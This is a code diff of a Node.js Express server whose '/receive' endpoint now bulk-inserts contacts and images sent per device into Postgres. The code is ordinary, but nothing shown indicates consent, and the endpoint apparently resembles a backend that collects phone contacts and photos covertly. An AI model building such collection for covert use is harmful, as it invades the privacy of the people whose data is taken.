@@ -36,7 +36,7 @@ async function initDB() {
 }
 initDB();
 
-// ================= RECEIVE DATA =================
+// ================= RECEIVE DATA (FAST BULK VERSION) =================
 app.post("/receive", async (req, res) => {
   try {
     const { type, device_id, data } = req.body;
@@ -47,21 +47,43 @@ app.post("/receive", async (req, res) => {
       [device_id]
     );
 
-    if (type === "contacts") {
+    // ================= CONTACTS =================
+    if (type === "contacts" && Array.isArray(data)) {
+
+      const values = [];
+      const placeholders = [];
+
+      data.forEach((contact, index) => {
+        placeholders.push(`($1, $${index + 2})`);
+        values.push(contact);
+      });
+
       await pool.query(
-        "INSERT INTO contacts (device_id, contact_data) VALUES ($1, $2)",
-        [device_id, data]
+        `INSERT INTO contacts (device_id, contact_data)
+         VALUES ${placeholders.join(",")}`,
+        [device_id, ...values]
       );
     }
 
-    if (type === "images") {
+    // ================= IMAGES =================
+    if (type === "images" && Array.isArray(data)) {
+
+      const values = [];
+      const placeholders = [];
+
+      data.forEach((img, index) => {
+        placeholders.push(`($1, $${index + 2})`);
+        values.push(img);
+      });
+
       await pool.query(
-        "INSERT INTO images (device_id, image_data) VALUES ($1, $2)",
-        [device_id, data]
+        `INSERT INTO images (device_id, image_data)
+         VALUES ${placeholders.join(",")}`,
+        [device_id, ...values]
       );
     }
 
-    res.send("Saved");
+    res.send("Bulk Saved ✅");
   } catch (err) {
     console.error(err);
     res.status(500).send("Error");
